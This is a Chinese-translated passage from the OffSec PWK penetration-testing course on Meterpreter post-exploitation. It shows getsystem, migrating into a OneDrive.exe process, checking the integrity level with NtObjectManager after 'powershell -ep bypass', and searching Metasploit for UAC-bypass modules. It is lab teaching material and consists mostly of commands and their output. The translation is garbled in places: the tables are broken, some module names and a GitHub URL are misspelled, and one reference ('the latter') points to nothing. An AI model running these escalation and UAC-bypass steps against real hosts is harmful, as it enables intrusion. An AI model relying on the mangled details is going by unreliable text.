
## 20.3.2 后执行模块 (Post-Exploitation Modules)

除了 Meterpreter 核心函数的命令和操作外，还有几个后执行模块可以部署到活动会话上。通过诸如客户端攻击创建的会话可能只为我们提供低权限的 shell。但如果目标用户是本地管理员组的成员，如果我们可以绕过用户账户控制 (UAC)，就可以将 shell 提升到高完整性级别。

在上一节中，我们将 Meterpreter 迁移到一个正在运行的（假设是中等完整性的）`OneDrive.exe` 进程。在本节中，让我们重复上一节的步骤并绕过 UAC，在 `ITWK01` 上绑定端口 `4444`，下载并执行 `met.exe`，使用 `getsystem` 提升权限。然后我们使用 `ps` 来识别 `OneDrive.exe` 的进程 ID 并迁移过去。

```
meterpreter > getsystem
...通过命名管道模拟 (Named Pipe Impersonation) 变获得了系统权限。

meterpreter > ps
```

进程列表 (Process List)

| PID | PPID | 名称 | 架构 | 会话 | 用户 |
| --- | --- | --- | --- | --- | --- |
| 8044 | 3912 | OneDrive.exe | x64 | 1 | ITWK01\offsec |
| | | | | | | C:\Users\offsec\AppData\Local\Microsoft\OneDrive.exe |

```
meterpreter > migrate 8044
[*] 正在从 9020 迁移到 8044...
[*] 迁移完成。
```

```
meterpreter > getuid
用户名: ITWK01\offsec
```

列表 682 - 迁移到 OneDrive 进程

列表 682 显示我们现在运行在 `offsec` 的上下文中。尽管这是一个管理员账户，除非我们绕过 UAC，否则 UAC 会阻止我们执行管理操作，因为当前进程的完整性级别为 Medium（中等）。

## OffSec

让我们假设后者已安装在系统上。一旦我们使用 `Import-Module` 导入模块，就可以使用 `Get-NtIntegrityLevel` 通过检索和查看分配的令牌来显示当前进程的完整性级别：

```
meterpreter > shell
进程 6436 创建。
通道 1 创建。
Microsoft Windows [版本 10.0.22003.795]
(c) Microsoft Corporation。保留所有权利。
```

```
C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
版权所有 (C) Microsoft。保留所有权利。
```

安装最新的 PowerShell 获取新功能和改进！
https://aka.ms/PSWindows

```
PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager
```

```
PS C:\Windows\system32> Get-NtIntegrityLevel
Get-NtIntegrityLevel
Medium
```

列表 683 显示我们当前以 Medium 完整性级别执行操作。接下来，将当前活动的通道放入后台并搜索以查找和利用 UAC 后执行模块。

```
PS C:\Windows\system32> ^Z
后台 1? [y/N] y

meterpreter > bg
[*] 后台会话 9...
```

列表 684 - 后台通道和会话

现在让我们搜索 UAC 绕过模块。

[994 (微软文档, 2022)](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)

[995 (PowerShell Gallery, 2022)](https://www.powershellgallery.com/packages/NtObjectManager/1/1.33)

[996 (微软文档, 2022)](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module/view-powershell-7-2)

[997 (GitHub, 2021)](https://github.com/googleprojector/sandbox-attacksurface-analysis-tools/blob/main/NtObjectManager/NtTokenIntegrityFunctions.ps1)

PWK - © 2023 OffSec Services Limited. 保留所有。

msf6 exploit(multi/handler) > search UAC

匹配模块

| 名称 | 披露日期 | 排名 | 检查描述 |
| --- | --- | --- | --- |
| 0 post/windows/manager/sticky_keys | | normal | | |
| No 1 exploit/windows/local/cve_2022_26904_superprofile | 2022-03-17 | excellent | Yes 用户配置文件任意联接本地权限提升 |
| 2 exploit/windows/local/bypass_windows_Creation_filesys | 2018-08-22 | manual | Windows 10 UAC 保护绕过 Windows Store (WSReset.exe) |
| Yes 3 exploit/windows/local/bypass_windows_store_reg | 2019-09-19 | manual | Windows 10 UAC 保护绕过 Windows Store |
| 11 exploit/windows/local/bypass_sdt | 2017-03-24 | excellent | UAC 绕过 (SilentCleanup) |

